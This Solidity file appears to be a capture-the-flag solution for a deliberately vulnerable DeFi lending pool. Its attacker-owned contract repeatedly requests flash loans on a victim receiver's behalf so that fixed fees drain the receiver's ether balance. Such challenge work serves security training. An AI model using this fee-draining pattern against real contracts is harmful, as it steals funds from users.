// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveDrainer {
    NaiveReceiverLenderPool private immutable pool;
    address private immutable owner;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
        owner = msg.sender;
    }

    function drain(address _receiver) external {
        require(msg.sender == owner, "niet");
        uint256 fee = pool.fixedFee();
        uint256 receiverBalance = _receiver.balance;
        uint256 rounds = receiverBalance / fee;

        for(uint256 i = 0; i < rounds; ++i) {
            pool.flashLoan(_receiver, 1);
        }
    }
}